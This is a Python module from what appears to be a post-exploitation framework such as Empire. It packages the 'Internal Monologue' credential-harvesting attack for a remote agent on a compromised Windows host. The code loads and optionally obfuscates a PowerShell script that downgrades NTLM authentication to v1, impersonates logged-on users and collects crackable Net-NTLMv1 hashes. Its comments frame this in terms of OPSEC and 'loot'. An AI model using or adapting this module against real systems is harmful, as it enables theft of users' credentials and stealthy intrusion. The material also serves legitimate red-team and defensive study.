from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-InternalMonologue',

            'Author': ['@eladshamir', '@4lex'],

            'Description': (
                'Uses the Internal Monologue attack to force easily-decryptable '
                'Net-NTLMv1 responses over localhost and without directly touching '
                'LSASS.\n'
                'https://github.com/eladshamir/Internal-Monologue'),

            'Background': False,

            'OutputExtension': None,

            'NeedsAdmin': True,

            'OpsecSafe': False,

            'Language': 'powershell',

            'MinLanguageVersion': '2',

            'Comments': [
                'The underlying powershell function accepts switches that '
                '[DISABLE] default behaviours. The default settings will '
                'downgrade NetNTLM responses to v1, impersonate all users, '
                'use challenge 1122334455667788 and restore the registry '
                'to its original state. Set the options in this module to '
                'True in order to DISABLE the behaviours\n'
                'Disabling Downgrade and Impersonation yields higher OPSEC, '
                'but less than ideal loot'
            ]
        }

        self.options = {
            'Agent': {
                'Description':   'Agent to use for InternalMonologue',
                'Required'   :   True,
                'Value'      :   ''
            },
            'Challenge': {
                'Description':   'Net-NTLM Challenge to send',
                'Required'   :   True,
                'Value'      :   '1122334455667788'
            },
            'Downgrade': {
                'Description':   'DISABLE downgrading to allow Net-NTLMv1 responses',
                'Required'   :   False,
                'Value'      :   ''
            },
            'Impersonate': {
                'Description':   'DISABLE user impersonation and fetch only current user',
                'Required'   :   False,
                'Value'      :   ''
            },
            'Restore': {
                'Description':   'DISABLE restoring the registry setting that allowed v1 responses',
                'Required'   :   False,
                'Value'      :   ''
            },
            'Verbose': {
                'Description':   'Verbose',
                'Required'   :   False,
                'Value'      :   ''
            }
        }

        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters are passed as
        #   an object set to the module and the options dictionary is
        #   automatically set. This is mostly in case options are passed on
        #   the command line.
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        modPath = "/data/module_source/credentials/Invoke-InternalMonologue.ps1"
        moduleSource = self.mainMenu.installPath + modPath 
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()
        script = moduleCode
        scriptEnd = "Invoke-InternalMonologue "

        # Add any arguments to the end execution of the script
        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
